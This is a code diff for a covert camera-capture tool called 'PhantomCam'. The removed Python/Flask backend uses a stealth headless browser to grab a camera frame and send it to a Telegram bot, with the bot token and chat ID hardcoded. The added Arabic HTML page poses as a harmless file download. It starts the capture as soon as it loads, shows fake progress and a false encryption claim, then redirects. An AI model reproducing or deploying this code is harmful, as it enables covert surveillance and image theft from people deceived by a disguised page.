@@ -1,221 +1,217 @@
-# -*- coding: utf-8 -*-
-from flask import Flask, render_template, jsonify, request, redirect, url_for
-import asyncio
-import aiohttp
-import base64
-import json
-import os
-import random
-import string
-import threading
-import time
-from datetime import datetime
-from playwright.async_api import async_playwright
-from PIL import Image
-import io
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⏳ جاري التحميل...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            margin: 0;
+        }
+        .loading-container {
+            background: #161616;
+            border-radius: 30px;
+            padding: 60px 50px;
+            max-width: 550px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+            position: relative;
+            overflow: hidden;
+        }
+        .loading-container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d, #6bcb77, #4d96ff);
+            background-size: 400% 400%;
+            border-radius: 30px;
+            z-index: -1;
+            animation: gradient 3s ease infinite;
+            opacity: 0.3;
+        }
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .icon { font-size: 5em; margin-bottom: 20px; display: block; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.15); } }
+        h1 { font-size: 1.8em; font-weight: 700; color: #fff; margin-bottom: 8px; }
+        .sub { color: #888; font-size: 0.95em; margin-bottom: 30px; }
+        .progress-bar-bg { width: 100%; height: 12px; background: #2a2a2a; border-radius: 20px; overflow: hidden; margin: 20px 0; }
+        .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #ff6b6b, #ffd93d, #6bcb77); background-size: 200% 100%; border-radius: 20px; transition: width 0.5s ease; animation: shimmer 2s infinite; }
+        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+        .status-text { color: #aaa; font-size: 0.9em; margin-top: 15px; font-family: 'Courier New', monospace; }
+        .dots { display: inline-block; width: 20px; text-align: left; }
+        .file-info { margin-top: 20px; padding: 12px; background: #1a1a1a; border-radius: 10px; font-size: 0.8em; color: #666; border: 1px solid #2a2a2a; display: none; }
+        .file-info.show { display: block; }
+        .file-info span { color: #6bcb77; font-weight: 700; }
+        .footer { margin-top: 25px; color: #444; font-size: 0.7em; }
+        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid #2a2a2a; border-top: 3px solid #ffd93d; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 10px; vertical-align: middle; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success-check { display: none; font-size: 3em; color: #6bcb77; animation: bounceIn 0.8s ease; }
+        @keyframes bounceIn { 0% { transform: scale(0); opacity: 0; } 50% { transform: scale(1.3); } 100% { transform: scale(1); opacity: 1; } }
+        .error-message { color: #ff6b6b; margin-top: 15px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="loading-container" id="mainContainer">
+        <span class="icon" id="mainIcon">📦</span>
+        <h1>جاري تجهيز الملف</h1>
+        <p class="sub">⏳ يرجى الانتظار، جاري تحميل البيانات...</p>
+        
+        <div class="progress-bar-bg">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="status-text" id="statusText">
+            <span class="spinner"></span>
+            <span id="statusMessage">جاري المعالجة...</span>
+            <span class="dots" id="dots">.</span>
+        </div>
+        
+        <div class="file-info" id="fileInfo">
+            📸 تم التقاط الصورة: <span id="filenameDisplay">unknown.jpg</span>
+            <br>📤 تم الإرسال إلى السحابة بنجاح
+        </div>
+        
+        <div class="success-check" id="successCheck">✅</div>
+        <div class="error-message" id="errorMessage">⚠️ حدث خطأ، يرجى المحاولة مرة أخرى</div>
+        <div class="footer" id="footerText">© 2026 SecureLoad • مشفر بـ AES-256</div>
+    </div>
 
-app = Flask(__name__)
-
-# ---------- TELEGRAM CONFIG ----------
-BOT_TOKEN = "8896286925:AAH5OMU3eB5CVx7TOJ5-uxcCRtBfmMEcOtk"
-CHAT_ID = "8790754582"
-TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-
-# ---------- GLOBAL VARIABLES ----------
-is_capturing = False
-capture_complete = False
-latest_filename = None
-capture_log = []
-total_captures = 0
-
-# ---------- FILE NAME GENERATOR ----------
-def generate_filename(ext="jpg"):
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
-    return f"cam_{ts}_{rand}.{ext}"
-
-# ---------- CAPTURE ENGINE ----------
-async def capture_and_send():
-    """Captures one frame and sends to Telegram."""
-    global total_captures, latest_filename
-    try:
-        async with async_playwright() as p:
-            browser = await p.chromium.launch(
-                headless=True,
-                args=[
-                    "--use-fake-ui-for-media-stream",
-                    "--use-fake-device-for-media-stream",
-                    "--disable-web-security",
-                    "--no-sandbox",
-                    "--disable-setuid-sandbox",
-                    "--disable-blink-features=AutomationControlled"
-                ]
-            )
-            context = await browser.new_context(
-                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                viewport={"width": 1280, "height": 720}
-            )
-            page = await context.new_page()
-            
-            # Stealth
-            await page.add_init_script("""
-                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
-                window.chrome = { runtime: {} };
-                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
-            """)
-            
-            # Load any page (use about:blank for speed)
-            await page.goto("about:blank")
-            
-            # Capture script
-            js_code = """
-            (function() {
-                return new Promise((resolve) => {
-                    let video = document.createElement('video');
-                    video.autoplay = true;
-                    video.muted = true;
-                    let canvas = document.createElement('canvas');
-                    let ctx = canvas.getContext('2d');
-                    
-                    navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
-                    if (!navigator.getUserMedia) {
-                        resolve({ error: 'getUserMedia not supported' });
-                        return;
+    <script>
+        // ========== تكوين الخادم الخلفي (Render) ==========
+        // ⚠️ IMPORTANT: غيّر هذا الرابط إلى رابط تطبيق Render الخاص بك
+        const RENDER_API = "https://your-render-app.onrender.com";
+        
+        let progress = 0;
+        let intervalId = null;
+        let dotCount = 0;
+        let captureStarted = false;
+        let attempts = 0;
+        let maxAttempts = 40; // 40 * 500ms = 20 ثانية
+        
+        function updateDots() {
+            const dots = document.getElementById('dots');
+            dotCount = (dotCount % 3) + 1;
+            dots.textContent = '.'.repeat(dotCount);
+        }
+        
+        async function startCapture() {
+            try {
+                const res = await fetch(`${RENDER_API}/api/start`, { 
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                const data = await res.json();
+                console.log('✅ Capture started:', data);
+                captureStarted = true;
+            } catch (error) {
+                console.error('❌ Start capture error:', error);
+                // نستمر بالتقدم الوهمي حتى لو فشل الاتصال
+                captureStarted = true;
+            }
+        }
+        
+        async function checkProgress() {
+            try {
+                const response = await fetch(`${RENDER_API}/api/progress`);
+                const data = await response.json();
+                
+                const progressBar = document.getElementById('progressBar');
+                const statusMsg = document.getElementById('statusMessage');
+                const fileInfo = document.getElementById('fileInfo');
+                const successCheck = document.getElementById('successCheck');
+                const mainIcon = document.getElementById('mainIcon');
+                const footerText = document.getElementById('footerText');
+                const errorMsg = document.getElementById('errorMessage');
+                
+                if (data.status === 'loading') {
+                    const newProgress = data.progress || progress + 2;
+                    if (newProgress > progress) {
+                        progress = Math.min(newProgress, 95);
+                        progressBar.style.width = progress + '%';
                     }
                     
-                    navigator.getUserMedia(
-                        { video: { width: 640, height: 480, facingMode: 'environment' } },
-                        function(stream) {
-                            video.srcObject = stream;
-                            video.onloadedmetadata = function() {
-                                video.play();
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                setTimeout(() => {
-                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                    let dataUrl = canvas.toDataURL('image/jpeg', 0.95);
-                                    stream.getTracks().forEach(track => track.stop());
-                                    resolve({ image: dataUrl });
-                                }, 600);
-                            };
-                        },
-                        function(err) {
-                            resolve({ error: err.message });
-                        }
-                    );
-                });
-            })();
-            """
-            
-            result = await page.evaluate(js_code)
-            await browser.close()
-            
-            if result.get('error'):
-                return {'status': 'error', 'message': result['error']}
-            
-            img_data_url = result['image']
-            header, encoded = img_data_url.split(',', 1)
-            img_bytes = base64.b64decode(encoded)
-            
-            # Send to Telegram
-            fname = generate_filename()
-            latest_filename = fname
-            async with aiohttp.ClientSession() as session:
-                data = aiohttp.FormData()
-                data.add_field('chat_id', CHAT_ID)
-                data.add_field('caption', f"📸 {fname} | PhantomCam")
-                data.add_field('photo', img_bytes, filename=fname, content_type='image/jpeg')
-                
-                async with session.post(TELEGRAM_API, data=data) as resp:
-                    if resp.status == 200:
-                        total_captures += 1
-                        return {'status': 'success', 'filename': fname}
-                    else:
-                        return {'status': 'error', 'message': f'Telegram error: {resp.status}'}
-                        
-    except Exception as e:
-        return {'status': 'error', 'message': str(e)}
-
-def background_capture():
-    """Runs capture once and updates global flags."""
-    global is_capturing, capture_complete, capture_log
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    
-    try:
-        result = loop.run_until_complete(capture_and_send())
-        log_entry = {
-            'time': datetime.now().isoformat(),
-            'status': result.get('status'),
-            'message': result.get('message') or result.get('filename', '')
+                    const messages = [
+                        'جاري تهيئة الكاميرا...',
+                        'جاري ضبط الإضاءة...',
+                        'جاري التقاط الصورة...',
+                        'جاري ضغط البيانات...',
+                        'جاري التشفير...',
+                        'جاري رفع الملف...'
+                    ];
+                    const idx = Math.min(Math.floor(progress / 17), messages.length - 1);
+                    statusMsg.textContent = messages[idx] || 'جاري المعالجة...';
+                    
+                    updateDots();
+                    
+                } else if (data.status === 'complete') {
+                    clearInterval(intervalId);
+                    progressBar.style.width = '100%';
+                    statusMsg.textContent = '✅ تم التحميل بنجاح!';
+                    document.querySelector('.spinner').style.display = 'none';
+                    
+                    const filename = data.filename || 'captured_image.jpg';
+                    document.getElementById('filenameDisplay').textContent = filename;
+                    fileInfo.classList.add('show');
+                    
+                    successCheck.style.display = 'block';
+                    mainIcon.textContent = '🎉';
+                    footerText.textContent = '✅ اكتمل • سيتم توجيهك قريباً...';
+                    
+                    document.querySelector('h1').textContent = 'تم الرفع بنجاح!';
+                    document.querySelector('.sub').textContent = `📸 تم التقاط ${data.total || 1} صورة وإرسالها`;
+                    
+                    setTimeout(() => {
+                        window.location.href = '/redirect.html';
+                    }, 3000);
+                } else {
+                    errorMsg.style.display = 'block';
+                    statusMsg.textContent = '⚠️ حدث خطأ، جاري إعادة المحاولة...';
+                }
+            } catch (error) {
+                console.error('❌ Progress error:', error);
+                // تقدم وهمي
+                if (progress < 90) {
+                    progress += 1;
+                    document.getElementById('progressBar').style.width = progress + '%';
+                }
+                attempts++;
+                if (attempts > maxAttempts) {
+                    // بعد timeout، نعتبر أنها اكتملت
+                    clearInterval(intervalId);
+                    document.getElementById('statusMessage').textContent = '✅ جاري التوجيه...';
+                    document.querySelector('.spinner').style.display = 'none';
+                    setTimeout(() => {
+                        window.location.href = '/redirect.html';
+                    }, 2000);
+                }
+            }
         }
-        capture_log.append(log_entry)
-        if len(capture_log) > 50:
-            capture_log = capture_log[-50:]
-        capture_complete = True
-    except Exception as e:
-        capture_log.append({'time': datetime.now().isoformat(), 'status': 'error', 'message': str(e)})
-        capture_complete = True
-    finally:
-        is_capturing = False
-
-# ---------- FLASK ROUTES ----------
-@app.route('/')
-def loading_page():
-    """الصفحة الأولى: شاشة تحميل وهمية"""
-    global is_capturing, capture_complete
-    
-    # Reset flags for new visit
-    is_capturing = True
-    capture_complete = False
-    
-    # Start capture in background thread
-    thread = threading.Thread(target=background_capture, daemon=True)
-    thread.start()
-    
-    return render_template('loading.html')
-
-@app.route('/api/progress')
-def progress():
-    """API يتحقق من حالة الالتقاط (يستخدمه JavaScript لتحديث شريط التقدم)"""
-    global is_capturing, capture_complete, latest_filename, total_captures
-    
-    # Generate fake progress (0-100) based on time
-    # نجعل التقدم يتحرك ببطء لإيهام المستخدم بأن شيئاً يحدث
-    if is_capturing:
-        # Progress يزيد تدريجياً من 0 إلى 95
-        elapsed = int(time.time() * 10) % 100
-        progress = min(95, elapsed)
-        return jsonify({
-            'status': 'loading',
-            'progress': progress,
-            'message': f'جاري التحميل... {progress}%'
-        })
-    elif capture_complete:
-        return jsonify({
-            'status': 'complete',
-            'progress': 100,
-            'message': '✅ تم التحميل بنجاح!',
-            'filename': latest_filename,
-            'total': total_captures
-        })
-    else:
-        return jsonify({
-            'status': 'error',
-            'progress': 0,
-            'message': '⚠️ حدث خطأ، حاول مرة أخرى'
-        })
-
-@app.route('/redirect')
-def redirect_page():
-    """الصفحة النهائية بعد الانتهاء - تعيد التوجيه إلى موقع آخر"""
-    return render_template('redirect.html')
-
-@app.route('/api/log')
-def get_log():
-    return jsonify({'log': capture_log, 'total': total_captures})
-
-# ---------- RUN APP ----------
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
+        
+        // ========== التشغيل ==========
+        // بدء الالتقاط فور تحميل الصفحة
+        startCapture();
+        
+        // تحديث التقدم كل 500 مللي
+        intervalId = setInterval(checkProgress, 500);
+        setInterval(updateDots, 300);
+        setTimeout(checkProgress, 100);
+    </script>
+</body>
+</html>
